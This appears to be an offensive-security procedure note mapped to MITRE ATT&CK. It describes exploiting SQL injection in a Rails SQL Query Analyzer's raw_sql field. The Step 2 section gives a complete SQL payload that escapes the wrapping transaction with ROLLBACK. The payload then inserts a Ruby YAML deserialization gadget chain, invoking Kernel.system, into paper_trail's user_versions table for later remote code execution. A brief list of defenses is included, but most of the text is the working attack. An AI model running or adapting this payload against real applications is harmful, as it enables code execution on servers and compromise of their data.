---
tags:
  - sqli
  - injection
  - postgres
type: procedure
tools:
  - '[[tools/paper_trail]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/malicious-sqli-payload]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:25.923Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f9deacfe-f9a2-4457-a388-6c4756e6aed0
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Malicious-SQL-to-Persist-Payload

## Summary

This procedure exploits SQL injection in the raw_sql parameter of the SQL Query Analyzer to escape the wrapping transaction using ROLLBACK, then inserts a malicious YAML deserialization payload into the user_versions table, persisting it for later triggering.

## Description

The vulnerability stems from unsanitized interpolation of user-supplied raw_sql into an EXPLAIN ANALYZE query wrapped in a transaction. By injecting '; ROLLBACK; --', the attacker ends the SELECT and escapes the transaction, allowing the INSERT to commit permanently. The payload targets the paper_trail gem's user_versions table, using a gadget chain for YAML deserialization leading to Ruby RCE. This affects PostgreSQL-backed Rails apps using paper_trail.

## Requirements

1. Access to SQL Query Analyzer interface
2. Knowledge of table schema (user_versions with columns: item_type, item_id, event, email, object)
3. Crafted YAML payload for deserialization

## Defense

Defensive measures and detection strategies:

- Parameterize all SQL queries; avoid raw interpolation
- Use database views or stored procedures for analysis tools
- Audit paper_trail object deserialization with YAML safe mode
- Monitor for anomalous INSERTs into audit tables

## Objectives

1. Bypass transaction safeguards to persist data
2. Store YAML payload in object column tied to a unique email trigger
3. Set up for deserialization without immediate detection

## Instructions

### Step 1: Prepare the Interface

**Context**: Ensure the 'public' database is selected and raw_sql field is ready.

No command; verify setup.

> Input field accepts multi-line SQL.

### Step 2: Execute Malicious Injection

**Context**: Submit the payload to escape and insert.

**Command** ([[commands/malicious-sqli-payload]]):
```sql
SELECT 1; ROLLBACK; INSERT INTO user_versions (item_type, item_id, event, email, object) VALUES ('User', 2, 'update', 'uniquekeywordtotriggercode@hackerone.com', '--- username: - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO io: &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: "abc" debug_output: &1 !ruby/object:Net::WriteAdapter socket: &1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module ''Kernel'' method_id: :system git_set: sleep 600 method_id: :resolve ' ); --
```

> The query runs; ROLLBACK commits the INSERT outside the transaction. Success if no error and record persists (verifiable via direct DB access).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/malicious-sqli-payload]]

## Tools Used

- [[tools/paper_trail]]

## Tags

- sqli
- injection
- postgres
